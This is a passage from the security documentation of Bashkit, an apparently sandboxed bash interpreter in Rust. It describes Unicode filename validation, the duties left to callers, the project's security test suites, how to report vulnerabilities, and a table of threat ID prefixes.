- eval harness: `chars().take()`, `from_utf8_lossy()` — all safe patterns
- curl/bc/export/date/comm/echo/archive/base64: All `.find()` use ASCII delimiters only
- scripted_tool: No byte/char patterns

**Path Validation:**

Filenames are validated by `find_unsafe_path_char()` which rejects:
- ASCII control characters (U+0000-U+001F, U+007F)
- C1 control characters (U+0080-U+009F)
- Bidi override characters (U+202A-U+202E, U+2066-U+2069)

Normal Unicode (accented, CJK, emoji) is allowed in filenames and script content.

**Caller Responsibility:**
- Strip zero-width/invisible characters from filenames before displaying to users
- Apply confusable-character detection (UTS #39) if showing filenames to humans
- Strip bidi overrides from script source before displaying to code reviewers
- Be aware that expr/printf/cut/tr may fail on non-ASCII input until fixes land
- Use ASCII in network allowlist URL patterns until byte/char fix lands

## Security Testing

Bashkit includes comprehensive security tests:

- **Threat Model Tests**: [`tests/threat_model_tests.rs`][threat_tests] - 117 tests
- **Unicode Security Tests**: `tests/unicode_security_tests.rs` - TM-UNI-* tests
- **Nesting Depth Tests**: 18 tests covering positive, negative, misconfiguration,
  and regression scenarios for parser depth attacks
- **Fail-Point Tests**: [`tests/security_failpoint_tests.rs`][failpoint_tests] - 14 tests
- **Network Security**: [`tests/network_security_tests.rs`][network_tests] - 53 tests
- **Builtin Error Security**: `tests/builtin_error_security_tests.rs` - 39 tests
- **Logging Security**: `tests/logging_security_tests.rs` - 26 tests
- **Git Security**: `tests/git_security_tests.rs` + `tests/git_remote_security_tests.rs`
- **Audit PoC Tests**: `tests/security_audit_pocs.rs` - 2026-03 deep audit findings
- **Fuzz Testing**: [`fuzz/`][fuzz] - Parser and lexer fuzzing

## Reporting Security Issues

If you discover a security vulnerability, please report it privately via
GitHub Security Advisories rather than opening a public issue.

## Threat ID Reference

All threats use stable IDs in the format `TM-<CATEGORY>-<NUMBER>`:

| Prefix | Category |
|--------|----------|
| TM-DOS | Denial of Service |
| TM-ESC | Sandbox Escape |
| TM-INF | Information Disclosure |
| TM-INJ | Injection |
| TM-NET | Network Security |
| TM-ISO | Multi-Tenant Isolation |
| TM-INT | Internal Error Handling |
| TM-LOG | Logging Security |
| TM-GIT | Git Security |
| TM-PY | Python/Monty Security |
| TM-UNI | Unicode Security |

Full threat analysis: [`specs/006-threat-model.md`][spec]

[limits]: https://docs.rs/bashkit/latest/bashkit/struct.ExecutionLimits.html
[fslimits]: https://docs.rs/bashkit/latest/bashkit/struct.FsLimits.html
[memory]: https://docs.rs/bashkit/latest/bashkit/struct.InMemoryFs.html
[system]: https://docs.rs/bashkit/latest/bashkit/struct.BashBuilder.html#method.username
[allowlist]: https://docs.rs/bashkit/latest/bashkit/struct.NetworkAllowlist.html
[client]: https://docs.rs/bashkit/latest/bashkit/struct.HttpClient.html
[threat_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/threat_model_tests.rs
[failpoint_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/security_failpoint_tests.rs
[network_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/network_security_tests.rs
[fuzz]: https://github.com/everruns/bashkit/tree/main/crates/bashkit/fuzz
[spec]: https://github.com/everruns/bashkit/blob/main/specs/006-threat-model.md
[parser]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/parser/mod.rs
[interp]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/interpreter/mod.rs
[date]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/date.rs
[diff]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/diff.rs
